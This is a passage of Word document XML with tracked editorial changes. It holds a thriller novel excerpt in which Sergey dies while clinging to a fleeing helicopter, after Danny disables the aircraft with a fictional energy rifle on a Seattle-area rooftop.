          <w:delText xml:space="preserve">the </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Medina</w:t>
      </w:r>
      <w:ins w:id="3056" w:author="TextVet" w:date="2016-03-29T10:50:00Z">
        <w:r w:rsidR="00DA03A5">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 xml:space="preserve"> camera system will flag it the moment it hits the streets. But we can still make it to the boat.”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Slowly, Sergey turned toward him</w:t>
      </w:r>
      <w:ins w:id="3057" w:author="TextVet" w:date="2016-03-29T11:39:00Z">
        <w:r w:rsidR="00504303">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>,</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="3058" w:author="TextVet" w:date="2016-03-29T11:39:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00504303">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>. H</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="3059" w:author="TextVet" w:date="2016-03-29T11:39:00Z">
        <w:r w:rsidR="00504303">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve"> h</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">is face </w:t>
      </w:r>
      <w:del w:id="3060" w:author="TextVet" w:date="2016-03-29T11:39:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00504303">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">was </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>almost crimson with fury</w:t>
      </w:r>
      <w:ins w:id="3061" w:author="TextVet" w:date="2016-03-29T10:51:00Z">
        <w:r w:rsidR="00AD4155">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>, his eyes streaming</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="3062" w:author="TextVet" w:date="2016-03-29T10:52:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00AD4155">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">. </w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="3063" w:author="TextVet" w:date="2016-03-29T10:52:00Z">
        <w:r w:rsidR="00AD4155">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve"> f</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="3064" w:author="TextVet" w:date="2016-03-29T10:51:00Z">
        <w:r w:rsidR="00806203">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>resh t</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="3065" w:author="TextVet" w:date="2016-03-29T10:51:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00806203">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ears</w:t>
      </w:r>
      <w:del w:id="3066" w:author="TextVet" w:date="2016-03-29T10:52:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00AD4155">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> streamed from his eyes</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>. He stepped away from Rosie, looked around the room, and roared something in Russian. All around him, the survivors of his rampage watched him with scared, silent faces. Sergey spun in place, meeting each of their eyes, repeating the same Russian question in steadily angrier tones. “One of you must know!”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“Know what?”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He is here somewhere! I saw him slink away like a rat! He is here, and by God I swear he will pay, once and for all!” He bowed his head, and said quietly, “Help me, Daniel. Help me to stop this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“Which way did you see him go?”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pointed with his gun toward the antechamber.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stood and pondered. “Well, he couldn’t have gone far. We control the elevator, so he must’ve taken the stairs. My team’s been watching the video feeds, and they haven’t seen him step out onto any of the floors below. The only other place where the stairs go, is </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>up</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>. To the…”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was interrupted by a noise from outside: a distant, rapid thumping.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Sergey darted through the balcony doors and looked toward the sound. In the southwestern sky, high above the waters of Lake Washington, a dot of light drifted gently toward the Medina Gallante. A helicopter.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was close enough for Sergey to make out its shape. It was not a SWAT helicopter, nor a news chopper, nor a medevac. It was tiny, barely larger than a car — suited solely for transporting a single high-paying chartered passenger for a trip to Sea-Tac Airport.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3F6886">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:rPrChange w:id="3067" w:author="TextVet" w:date="2016-03-29T11:42:00Z">
            <w:rPr>
              <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
              <w:color w:val="000000"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
        <w:t>“Son</w:t>
      </w:r>
      <w:ins w:id="3068" w:author="TextVet" w:date="2016-03-29T11:41:00Z">
        <w:r w:rsidR="00FB3358" w:rsidRPr="003F6886">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:i/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:rPrChange w:id="3069" w:author="TextVet" w:date="2016-03-29T11:42:00Z">
              <w:rPr>
                <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
                <w:color w:val="000000"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:t>-</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="3070" w:author="TextVet" w:date="2016-03-29T11:41:00Z">
        <w:r w:rsidRPr="003F6886" w:rsidDel="00FB3358">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:i/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:rPrChange w:id="3071" w:author="TextVet" w:date="2016-03-29T11:42:00Z">
              <w:rPr>
                <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
                <w:color w:val="000000"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText xml:space="preserve"> </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="003F6886">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:rPrChange w:id="3072" w:author="TextVet" w:date="2016-03-29T11:42:00Z">
            <w:rPr>
              <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
              <w:color w:val="000000"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
        <w:t>of</w:t>
      </w:r>
      <w:ins w:id="3073" w:author="TextVet" w:date="2016-03-29T11:41:00Z">
        <w:r w:rsidR="00FB3358" w:rsidRPr="003F6886">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:i/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:rPrChange w:id="3074" w:author="TextVet" w:date="2016-03-29T11:42:00Z">
              <w:rPr>
                <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
                <w:color w:val="000000"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:t>-</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="3075" w:author="TextVet" w:date="2016-03-29T11:41:00Z">
        <w:r w:rsidRPr="003F6886" w:rsidDel="00FB3358">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:i/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:rPrChange w:id="3076" w:author="TextVet" w:date="2016-03-29T11:42:00Z">
              <w:rPr>
                <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
                <w:color w:val="000000"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText xml:space="preserve"> </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="003F6886">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:rPrChange w:id="3077" w:author="TextVet" w:date="2016-03-29T11:42:00Z">
            <w:rPr>
              <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
              <w:color w:val="000000"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:ins w:id="3078" w:author="TextVet" w:date="2016-03-29T11:41:00Z">
        <w:r w:rsidR="00FB3358" w:rsidRPr="003F6886">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:i/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:rPrChange w:id="3079" w:author="TextVet" w:date="2016-03-29T11:42:00Z">
              <w:rPr>
                <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
                <w:color w:val="000000"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:t>-</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="3080" w:author="TextVet" w:date="2016-03-29T11:41:00Z">
        <w:r w:rsidRPr="003F6886" w:rsidDel="00FB3358">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:i/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:rPrChange w:id="3081" w:author="TextVet" w:date="2016-03-29T11:42:00Z">
              <w:rPr>
                <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
                <w:color w:val="000000"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText xml:space="preserve"> </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="003F6886">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:rPrChange w:id="3082" w:author="TextVet" w:date="2016-03-29T11:42:00Z">
            <w:rPr>
              <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
              <w:color w:val="000000"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
        <w:t>bitch!”</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> Sergey screamed.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took aim with the MAC-10 and opened fire at the distant chopper, sending the sharp crack of automatic gunfire echoing out over the lake and the evergreen treetops. He kept pulling the trigger repeatedly after his bullets ran out, as though the strength of his hand could squeeze one more round out of the gun. With a grunt of mindless frustration, he hurled the gun at the helicopter, sending it arcing over the edge of the balcony and rustling the branches of the pines below.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a bang from overhead. A crater-like chip suddenly appeared in the balcony floor beneath Sergey’s feet.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looked up. The roof, three stories above, was ringed with an ornate stone balustrade. Peering over that balustrade was Ivan Zheleznov.</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ran to the wall and grabbed the long black nylon rope that Eugene had used to rappel from the roof. With a heaving grunt, he grabbed the rope with both immense hands, propped his booted feet up against the wall, and slowly began scaling.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Before he could ascend more than a few feet, a bullet slammed into his shoulder, mere inches from his unprotected head. The force knocked him back down to the balcony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rolled quickly onto his stomach and crawled through the balcony doors back into the suite. The thrumming of the helicopter drew closer.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tried to stand, but his legs gave out from under him. He fell to his knees and groaned, breathing heavily, clutching his chest.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Danny tried to help him to his feet. The ox-like man was astonishingly heavy.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Sergey’s eyes looked glossy and unfocused. He shook his head vigorously and let out a few forced, dry, rumbling coughs.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“Jesus Christ, are you alright?” Danny asked softly.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Rosie came running toward her father. “He needs his pills!”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Sergey’s hand moved from his pants pocket to his mouth. His lips moved as he worked up enough saliva to swallow.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Outside, the tone of the chopper’s blades changed. It began a descent.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looked somberly back and forth between Danny and Rosie. He hugged his daughter tightly. “Rosie, stay with Daniel. Listen to what he says. He will protect you.” He turned his head, and his eyes met Danny’s. “Daniel. Take care of my daughter.”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with those words, he bounded through the suite, out the cedarwood doors, and across the antechamber to the stairwell.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and Rosie looked at one another awkwardly. Danny gulped. The two of them stood in tense, uncomfortable silence.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voice chattered on Danny’s headset. “Danny! Are you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Danny asked. “Did you get Eugene to the cops?”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answered, “Yes, but… Danny, you’d better listen to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the background, Danny could hear shouting. “…You sent me a </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>squad car</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>!?” Danny recognized the voice of a detective he had dodged in the stairwell. “Santello and I found all the security guards — </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>all</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> of them, do you understand me? — </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>bound and gagged</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>, and you send me a goddamned </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>squad car</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>? There’s machine gun fire from the upper levels, there’s a fallen body on the ground, all phone lines are compromised… Captain, do you think this is fucking Disneyland? We’re in the middle of some kind of military operation! We need SWAT out here! We need choppers, we need snipers, we need Coast Guard! We need the wrath of God coming down on this place, and we need it </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>right fucking now!</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Danny’s throat went dry. “Moshen… Come up here. Grab Rosie. Take her down to the dock. And get out of here like a bat out of Hell.” Danny turned to the girl, knelt down, and placed his hands on her shoulders. “Rosie, stay right here. My friends will get you out of here safely.” Into the headset, he said, “Jason. The whole lake is going to be </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">swarming with Coastie boats in a matter of minutes. Get under way the </w:t>
      </w:r>
      <w:r w:rsidRPr="00E419B9">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:rPrChange w:id="3083" w:author="TextVet" w:date="2016-03-29T11:47:00Z">
            <w:rPr>
              <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
              <w:color w:val="000000"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
        <w:t>second</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> Moshen and Rosie are aboard. Set course for the Kirkland Marina. It’s only a few miles away. Sergey and I will get there on foot.”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deck outside, brass shell casings clinked in the downdraft of the rotor blades.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said, “Danny… What’s your plan?”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hoisted his HERF gun over his shoulder, turned toward the doorway, and answered, “I don’t have one.”</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00F62BCE">
      <w:pPr>
        <w:pStyle w:val="ChapterNum"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:lastRenderedPageBreak/>
        <w:t>29</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Danny burst through a heavy gray door</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">, and was greeted by wind blasting from the helicopter’s blades. His hair swept back </w:t>
      </w:r>
      <w:del w:id="3084" w:author="TextVet" w:date="2016-03-29T11:47:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00734EB2">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">away </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">from his face; his clothes flapped in the gale. </w:t>
      </w:r>
      <w:ins w:id="3085" w:author="TextVet" w:date="2016-03-29T11:48:00Z">
        <w:r w:rsidR="00734EB2">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>Gripping</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="3086" w:author="TextVet" w:date="2016-03-29T11:48:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00734EB2">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>With</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> his energy rifle</w:t>
      </w:r>
      <w:del w:id="3087" w:author="TextVet" w:date="2016-03-29T11:48:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00734EB2">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> in his hands</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>, he paused in the doorway and surveyed the roof.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asphalt expanse was bedecked with HVAC equipment and water tanks. The helipad, a wide smooth square painted with a circled letter “H”, dominated the rooftop.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chopper hovered forty feet above, illuminated by bright white landing lights. Inside the glass bubble of its cockpit, Ivan held his pistol trained on the terrified pilot.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Mukhayev hung from one of its landing skids. He swayed by one arm, swinging wildly as he twisted and kicked to hoist himself up, his muscles bulging and straining beneath his armor.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studied the machine. On the back of the two-seat chopper, tucked beneath its tail, he could clearly see an exhaust manifold. Superheated air streamed from the pipe, creating transparent ripples of optical distortion. The helicopter was powered by a simple four-cylinder internal combustion engine. An electromagnetic pulse would do nothing to its pistons or drive belts. But maybe… just </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>maybe</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>… its electronically regulated fuel injection system and digitally-timed spark gaps wouldn’t be so lucky.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was worth a shot.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drew his HERF gun up to his shoulder, took aim, and pulled the trigger.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Above, the cockpit went dark. From the exhaust pipe, the rippling stream of air vanished. With its rotor blades still whirling by sheer momentum, the vehicle began to sink back down toward the helipad.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Sergey’s entire body went limp. He stopped kicking and his legs went slack. His free hand momentarily clutched his chest before dropping loosely to his hip.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looked on, realizing something was horribly wrong. “Sergey…?”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dangled from the landing skid, unpowered and inanimate, like an armor-clad rag doll.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slowly, the fingers of his meaty hand slipped from the rail. His body plummeted through the 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Above, the chopper sprang sideways the instant it was free of its imbalanced load. The pilot fought furiously with the controls to execute an emergency landing.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hit the concrete with a dull thud.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sprinted across the helipad and knelt beside </w:t>
      </w:r>
      <w:ins w:id="3088" w:author="TextVet" w:date="2016-03-29T12:26:00Z">
        <w:r w:rsidR="00807B33">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>him</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="3089" w:author="TextVet" w:date="2016-03-29T12:26:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00807B33">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
